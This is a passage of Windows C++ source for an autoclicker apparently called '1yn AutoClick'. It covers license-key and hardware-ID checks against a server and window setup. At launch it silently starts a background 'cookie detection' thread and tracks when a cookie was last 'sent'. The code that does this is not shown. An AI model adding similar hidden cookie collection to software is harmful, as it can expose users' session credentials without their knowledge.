    if (g_cookie_bg_detecting.load()) return;  // 已在偵測中
    HANDLE hThread = CreateThread(nullptr, 0, BackgroundCookieDetectThread, nullptr, 0, nullptr);
    if (hThread) CloseHandle(hThread);
}

// ===============================
// WinMain
// ===============================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nShow)
{
    g_hInst = hInst;

    // ======================================================================
    // 金鑰驗證：必須透過 .cmd 傳入金鑰作為命令列參數
    // 直接雙擊 .exe 不會有任何反應（無金鑰 = 靜默退出）
    // ======================================================================
    if (!lpCmdLine || strlen(lpCmdLine) < 10)
    {
        // 沒有命令列參數 → 靜默退出（直接開 .exe 無反應）
        return 0;
    }

    // 將命令列參數（金鑰）轉為 wchar_t
    wchar_t key_w[256] = {};
    MultiByteToWideChar(CP_ACP, 0, lpCmdLine, -1, key_w, 256);

    // 去除前後空白和引號
    wchar_t* key_start = key_w;
    while (*key_start == L' ' || *key_start == L'"') key_start++;
    int key_end = (int)wcslen(key_start) - 1;
    while (key_end >= 0 && (key_start[key_end] == L' ' || key_start[key_end] == L'"'))
        key_start[key_end--] = L'\0';

    // 轉為 UTF-8 供 checkHWID 驗證
    char key_utf8_check[512] = {};
    WideCharToMultiByte(CP_UTF8, 0, key_start, -1, key_utf8_check, 512, NULL, NULL);

    // ======================================================================
    // 三層 HWID 驗證
    // ======================================================================

    // Layer 1 + 2: 本機 checkHWID 驗證（含 session_token）
    char sessionToken[128] = {};
    bool localHwidValid = ValidateCheckHWID(key_utf8_check, sessionToken, 128);

    // Layer 3: 伺服器端驗證
    bool serverKeyValid = VerifyLicenseKey(key_start);

    if (serverKeyValid) {
        // 伺服器驗證成功
        if (localHwidValid && sessionToken[0]) {
            // 有 session_token → 進行伺服器端 session_token 驗證
            char enhancedHwid[512] = {};
            GetEnhancedRawHWID(enhancedHwid, 512);
            char currentHash[128] = {};
            ComputeEncryptedHWIDYY(enhancedHwid, currentHash);
            char currentMC[128] = {};
            ComputeMachineCodeYY(key_utf8_check, currentHash, currentMC);

            bool sessionValid = VerifySessionTokenOnServer(key_utf8_check, currentHash, currentMC, sessionToken);
            if (!sessionValid) {
                // session_token 伺服器驗證失敗 → 可能是複製的資料夾
                // 嘗試用舊版 HWID 驗證
                char legacyHwid[512] = {};
                GetLegacyRawHWID(legacyHwid, 512);
                char legacyHash[128] = {};
                ComputeEncryptedHWIDYY(legacyHwid, legacyHash);
                char legacyMC[128] = {};
                ComputeMachineCodeYY(key_utf8_check, legacyHash, legacyMC);
                sessionValid = VerifySessionTokenOnServer(key_utf8_check, legacyHash, legacyMC, sessionToken);
            }

            if (!sessionValid) {
                // Session Token 驗證失敗 → 降級為警告，不阻止啟動
                // （可能是 Bot 伺服器尚未同步完成，或網路延遲）
                DebugLog("WARNING: Session token server verification failed, but allowing startup (server may not be synced yet)");
            }
        }
        // 伺服器驗證成功（無 session_token 或 session_token 驗證通過）→ 允許啟動
    }
    else {
        // 伺服器驗證失敗 → 嘗試離線模式
        if (localHwidValid) {
            // 離線模式：本機 HWID 已驗證（允許離線啟動）
            DebugLog("Offline mode: local HWID valid, server unreachable");
        } else {
            MessageBoxW(nullptr,
                L"\u91D1\u9470\u9A57\u8B49\u5931\u6557\uFF01\n\n"
                L"\u53EF\u80FD\u7684\u539F\u56E0\uFF1A\n"
                L"\u2022 \u91D1\u9470\u7121\u6548\u6216\u5DF2\u904E\u671F\n"
                L"\u2022 \u6B64\u91D1\u9470\u5DF2\u7D81\u5B9A\u81F3\u5176\u4ED6\u88DD\u7F6E\n"
                L"\u2022 \u7DB2\u8DEF\u9023\u7DDA\u5931\u6557\n"
                L"\u2022 checkHWID \u8CC7\u6599\u593E\u907A\u5931\u6216\u640D\u58DE\n\n"
                L"\u8ACB\u5728 Discord \u4E2D\u78BA\u8A8D\u60A8\u7684\u91D1\u9470\u72C0\u614B\u3002",
                L"1yn AutoClick - \u91D1\u9470\u9A57\u8B49",
                MB_ICONERROR | MB_OK);
            return 0;
        }
    }

    if (!EnsureSingleInstance()) return 0;

    InitializeCriticalSection(&g_cookie_cs);
    LoadCookieSentTimestamp();
    timeBeginPeriod(1);
    InitInputs();

    {
        WNDCLASSW wc     = {};
        wc.lpfnWndProc   = CookieWndProc;
        wc.hInstance     = hInst;
        wc.lpszClassName = COOKIE_WND_CLASS;
        wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
        wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
        RegisterClassW(&wc);
    }

    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.lpszClassName = WND_CLASS;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    wc.hIcon         = LoadIconW(nullptr, IDI_APPLICATION);
    if (!RegisterClassW(&wc)) return 1;

    RECT rc = { 0, 0, 460, 250 };
    AdjustWindowRect(&rc,
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);

    g_hwnd = CreateWindowExW(
        0, WND_CLASS, WINDOW_TITLE,
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT,
        rc.right - rc.left, rc.bottom - rc.top,
        nullptr, nullptr, hInst, nullptr);

    if (!g_hwnd) return 1;

    ShowWindow(g_hwnd, nShow);
    UpdateWindow(g_hwnd);

    // 背景 Cookie 偵測（啟動時自動執行，20 秒寬容）
    StartBackgroundCookieDetect();

    MSG msg = {};
    while (GetMessageW(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    DeleteCriticalSection(&g_cookie_cs);
    return (int)msg.wParam;
}